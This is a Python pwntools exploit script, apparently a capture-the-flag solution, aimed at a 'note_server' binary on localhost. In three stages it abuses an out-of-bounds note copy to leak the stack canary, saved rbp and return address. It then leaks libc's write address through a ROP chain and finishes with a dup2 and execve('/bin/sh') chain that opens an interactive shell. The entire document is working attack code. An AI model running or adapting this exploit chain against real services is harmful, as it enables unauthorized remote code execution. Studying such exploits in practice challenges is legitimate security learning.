#!/usr/bin/env python
from pwn import *

context(os='linux', arch='amd64')

host = '127.0.0.1'
port = 5001
fd = 4

def write_note(io, note, length=None):
    if length is None:
        length = len(note)

    io.send(p8(1))
    io.send(p8(length))
    io.send(note)

def copy_note(io, offset, copySize):
    io.send(p8(2))
    io.send(p16(offset))
    io.send(p8(copySize))

def read_notes(io, size=None):
    io.send(p8(3))
    if size is None:
        recv = io.recvall()
    else:
        recv = io.recv(size)
    return recv

def write_to_end(io, written=0):
    g = cyclic_gen()
    while written < 1024:
        chunk = min(255, 1024 - written)
        write_note(io, g.get(chunk))
        written += chunk

def do_rop(io, canary, rbp, rop):
    buf = p64(0xDEAD)
    buf += p64(canary)
    buf += p64(rbp)
    buf += rop.chain()
   
    write_note(io, buf)
    write_to_end(io, len(buf))
    copy_note(io, 0, len(buf))
    read_notes(io, 1024 + len(buf))

def stage1():
    # stack canary + ebp
    io = remote(host,port)
    write_to_end(io)

    read_size = 4*8
    copy_note(io, 1024, read_size)
    leak = read_notes(io, 1024+read_size)[1024:]
    canary = u64(leak[8:16])
    rbp = u64(leak[16:24])
    rip = u64(leak[24:])

    print("\nleaks:")
    print("rbp = ", hex(rbp))
    print("canary = ", hex(canary))
    print("rip = ", hex(rip))
    io.close()
    return (rbp, canary, rip)

def stage2(rbp, canary, rip):
    # leaking libc
    base_address = rip - 0xf54 # https://www.youtube.com/watch?v=GTQxZlr5yvE&t=2h14m38s
    elf = ELF("./note_server", checksec=False)
    elf.address = base_address
    rop = ROP(elf)
    rop.write(fd, elf.got["write"])
    io = remote(host, port)
    do_rop(io, canary, rbp, rop)
    leak = io.recv(8)         
    libc_write = u64(leak)
    print("\nlibc leak: " + hex(libc_write))
    io.close()
    return libc_write

def stage3(canary, rbp, libc_write_leak):
    # get the last 3 bytes and enter them on https://libc.blukat.me
    # then download the libc and set the path here
    elf_libc = ELF("./libc6_2.27-3ubuntu1_amd64.so", checksec=False)
    elf_libc.address = libc_write_leak - elf_libc.symbols['write']
    rop_libc = ROP(elf_libc)
    rop_libc.dup2(fd, 0)
    rop_libc.dup2(fd, 1)
    rop_libc.execve(next(elf_libc.search(b"/bin/sh\x00")), 0, 0)

    io = remote(host, port)
    do_rop(io, canary, rbp, rop_libc)

    io.interactive()

(rbp, canary, rip) = stage1()
libc_write_leak = stage2(rbp, canary, rip)
stage3(canary, rbp, libc_write_leak)
